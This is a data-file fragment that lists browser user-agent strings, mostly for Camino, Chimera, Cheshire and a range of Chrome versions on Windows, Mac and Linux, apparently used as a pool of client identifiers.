"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061113 BonEcho/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061112 BonEcho/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20060930 BonEcho/2.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1) Gecko/20061026 BonEcho/2.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1) Gecko/20061025 BonEcho/2.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1) Gecko/20061024 BonEcho/2.0",
"Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9a1) Gecko/20061128 BonEcho/0.7b1",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Browzar)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.723+ (Firefox compatible)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; XH; rv:8.578.498) fr, Gecko/20121021 Camino/8.443+ (Firefox compatible)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20130628 Camino/3.245.226 (MultiLang) (like Firefox/3.621.218)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.93.26.2658) Gecko/20141026 Camino/2.176.223 (MultiLang) (like Firefox/3.64.2268)0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.14pre) Gecko/20101212 Camino/2.1a1pre (like Firefox/3.6.14pre)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.2.29pre) Gecko/20130101 Camino/2.1.3pre (like Firefox/3.6.29pre)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; de; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.8; it; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; fr; rv:1.9.2.28) Gecko/20120308 Camino/2.1.2 (MultiLang) (like Firefox/3.6.28)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.2.24) Gecko/20111114 Camino/2.1 (like Firefox/3.6.24)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.8pre) Gecko/2009022800 Camino/2.0b3pre",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en; rv:1.9.0.10pre) Gecko/2009041800 Camino/2.0b3pre (like Firefox/3.0.10pre)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; it; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.19) Gecko/2010111021 Camino/2.0.6 (MultiLang) (like Firefox/3.0.19)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.4; en; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (like Firefox/3.0.19)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; nl; rv:1.9.0.19) Gecko/2010051911 Camino/2.0.3 (MultiLang) (like Firefox/3.0.19)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.0.18) Gecko/2010021619 Camino/2.0.2 (like Firefox/3.0.18)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.8.1.4pre) Gecko/20070511 Camino/1.6pre",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; de; rv:1.8.1.5pre) Gecko/20070605 Camino/1.6a1pre",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4pre) Gecko/20070526 Camino/1.6a1pre",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4pre) Gecko/20070521 Camino/1.6a1pre",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; it; rv:1.8.1.21) Gecko/20090327 Camino/1.6.7 (MultiLang) (like Firefox/2.0.0.21pre)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; fr; rv:1.8.1.21) Gecko/20090327 Camino/1.6.7 (MultiLang) (like Firefox/2.0.0.21pre)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.8.1.21) Gecko/20090327 Camino/1.6.7 (like Firefox/2.0.0.21pre)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.24) Gecko/20100305 Camino/1.6.11 (like Firefox/2.0.0.24)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.8.1.12) Gecko/20080206 Camino/1.5.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X Mach-O; en; rv:1.8.1.12) Gecko/20080206 Camino/1.5.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.8.1.6) Gecko/20070809 Camino/1.5.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.6) Gecko/20070809 Firefox/2.0.0.6 Camino/1.5.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.6) Gecko/20070809 Camino/1.5.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 Camino/1.5.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.8.1.4) Gecko/20070509 Camino/1.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4) Gecko/20070609 Camino/1.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4) Gecko/20070607 Camino/1.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4) Gecko/20070509 Camino/1.5",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.9a4pre) Gecko/20070404 Camino/1.2+",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4pre) Gecko/20070417 Camino/1.1b+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en; rv:1.8.1.2pre) Gecko/20070227 Camino/1.1b",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.2pre) Gecko/20070223 Camino/1.1b",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.2pre) Gecko/20070108 Camino/1.1a2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.1pre) Gecko/20061126 Camino/1.1a1+",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1) Gecko/20061018 Camino/1.1a1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.1) Gecko/20060203 Camino/1.0rc1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1) Gecko/20060119 Camino/1.0b2+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8) Gecko/20051229 Camino/1.0b2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8) Gecko/20051228 Camino/1.0b1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8) Gecko/20051107 Camino/1.0b1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050914 Camino/1.0a1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.10) Gecko/20070228 Camino/1.0.4",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.10) Gecko/20070228 Camino/1.0.4",
"Mozilla/5.0 (Macintosh; U; PPC Max OS X Mach-O; it-IT; rv:1.8.0.7) Gecko/200609211 Camino/1.0.3",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.7) Gecko/20060911 Camino/1.0.3 (MultiLang)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.7) Gecko/20060911 Camino/1.0.3",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.7) Gecko/20060911 Camino/1.0.3",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.4) Gecko/20060613 Camino/1.0.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.4) Gecko/20060613 Camino/1.0.2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.3) Gecko/20060503 Camino/1.0.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.3) Gecko/20060427 Camino/1.0.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1b1) Gecko/20060807 Camino/1.0+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1b1) Gecko/20060721 Camino/1.0+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a3) Gecko/20060528 Camino/1.0+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1) Gecko/20061013 Camino/1.0+ (Firefox compatible)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1) Gecko/20061013 Camino/1.0+",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1a3) Gecko/20060601 Camino/1.0+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1) Gecko/20060307 Camino/1.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1) Gecko/20060214 Camino/1.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8b5) Gecko/20051021 Camino/1.0+",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.0.1) Gecko/20060214 Camino/1.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b2) Gecko Camino/0.9+",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7) Gecko/20040517 Camino/0.8b",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8) Gecko/20050427 Camino/0.8.4",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.2) Gecko/20040825 Camino/0.8.1",
"Mozilla/5.0 Gecko/20030306 Camino/0.7",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20030306 Camino/0.7",
"Mozilla/4.08 (Charon; Inferno)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko, Safari) Cheshire/1.0.UNOFFICIAL",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Safari) Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko, Safari/111) Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko, Safari) Safari/419.3 Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) Safari/419.3 Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.9 (KHTML, like Gecko) AppleWebKit/418.9 Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/125) Cheshire/1.0.ALPHA",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; pl-PL; rv:1.0.1) Gecko/20021111 Chimera/0.6",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0.1) Gecko/20021111 Chimera/0.6",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0.1) Gecko/20021104 Chimera/0.6",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20030111 Chimera/0.6",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20030109 Chimera/0.6",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20021220 Chimera/0.6",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20021216 Chimera/0.6",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
"Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
"Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36",
"Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
"Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.0 Safari/537.13",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11",
"Mozilla/5.0 (Windows NT 6.0) yi; AppleWebKit/345667.12221 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/453667.1221",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
"Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/1EA69",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1042.0 Safari/535.21",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.21 (KHTML, like Gecko) Chrome/19.0.1041.0 Safari/535.21",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872",
"Mozilla/5.0 (X11; CrOS i686 1660.57.0) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.46 Safari/535.19",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Ubuntu/11.10 Chromium/18.0.1025.142 Chrome/18.0.1025.142 Safari/535.19",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
